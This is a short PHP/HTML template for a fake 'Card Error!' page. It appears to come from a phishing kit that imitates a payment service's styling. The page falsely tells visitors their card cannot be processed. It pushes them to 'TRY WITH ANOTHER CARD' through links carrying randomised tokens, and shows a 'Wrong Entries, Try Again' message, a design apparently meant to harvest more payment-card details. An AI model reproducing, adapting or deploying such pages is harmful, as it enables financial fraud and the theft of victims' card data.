...
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Card Error!</title>
...
<style>
	...
	*{box-sizing:border-box;}	
	...
	.vx_form-group{position:relative;margin:10px 0;}
...
<header class="vx_modal-header"><h1>Error !</h1></header></h1><div class="ui-message-container <?php if(isset($_GET[''.$theerrkey.''])==false){echo "hide";};?>" id="errcont"><div data-uia="text" class="ui-message-contents" id="errctnt">Wrong Entries, Try Again</div></div>
...
<div class="formbase">
<img src="../fnset/error_alert.png" width="150px"/>
<div class="vx_form-group vx_floatingLabel_active">Sorry but the card you used can't be processed right now</div>
<a href="wallet?y=<?php echo md5(rand(100,999999)); ?>" class="btn_info" title="" onclick="load()">TRY WITH ANOTHER CARD</a>
<div class="loginSignUpSeparator"><span class="textInSeparator">or</span></div>
<a href="fbrel?signinIDX=<?php echo md5(uniqid()); ?>" class="btn_info" title="" onclick="load()">TRY NEXT TIME</a>
</div>
</div>
</form>
</div>
